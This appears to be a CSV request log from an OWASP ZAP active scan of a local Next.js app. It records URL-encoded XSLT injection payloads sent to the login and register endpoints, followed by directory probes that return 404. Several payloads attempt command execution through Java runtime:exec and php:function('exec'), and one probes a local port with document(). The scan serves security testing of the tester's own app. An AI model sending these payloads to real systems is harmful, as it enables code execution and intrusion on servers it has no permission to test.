2659,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,86,303,3854
2660,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=system-property%28%27xsl%3Avendor%27%29%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,122,335,19013
2661,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,35,303,3854
2662,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,29,303,3854
2663,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,95,335,19233
2664,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,19189
2665,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,818,345,11938274
2666,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,62,335,19177
2667,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,81,335,20295
2668,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,69,335,19279
2669,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%3C&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,73,335,18809
2670,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,19089
2671,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=system-property%28%27xsl%3Avendor%27%29%2F%3E&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,18945
2672,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,59,335,19165
2673,Fri Sep 25 14:42:18 IST 2026,Fri Sep 25 14:42:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,517,345,11938274
2674,Fri Sep 25 14:42:19 IST 2026,Fri Sep 25 14:42:19 IST 2026,GET,http://localhost:3000,200,OK,77,533,27949
2675,Fri Sep 25 14:42:19 IST 2026,Fri Sep 25 14:42:19 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,54,341,9953
2676,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next,404,Not Found,58,341,9945
2677,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static,404,Not Found,59,341,9956
2678,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks,404,Not Found,7,265,9
2679,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app,404,Not Found,6,265,9
2680,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/about,404,Not Found,6,265,9
2681,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/contact,404,Not Found,6,265,9
2682,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/faq,404,Not Found,5,265,9
2683,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/login,404,Not Found,6,265,9
2684,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/register,404,Not Found,6,265,9
2685,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/css,404,Not Found,32,265,9
2686,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/css/app,404,Not Found,5,265,9
2687,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/_next/static/media,404,Not Found,6,265,9
2688,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:20 IST 2026,GET,http://localhost:3000/images,404,Not Found,56,341,9946
2689,Fri Sep 25 14:42:20 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000,200,OK,91,533,27949
2690,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,43,341,9953
2691,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next,404,Not Found,62,341,9945
2692,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static,404,Not Found,43,341,9956
2693,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/chunks,404,Not Found,5,265,9
2694,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/app,404,Not Found,5,265,9
2695,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/about,404,Not Found,6,265,9
2696,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/contact,404,Not Found,6,265,9
2697,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/faq,404,Not Found,6,265,9
2698,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/login,404,Not Found,15,265,9
2699,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/register,404,Not Found,6,265,9
2700,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/css,404,Not Found,6,265,9
2701,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/css/app,404,Not Found,7,265,9
2702,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/_next/static/media,404,Not Found,7,265,9
2703,Fri Sep 25 14:42:21 IST 2026,Fri Sep 25 14:42:21 IST 2026,GET,http://localhost:3000/images,404,Not Found,118,341,9946
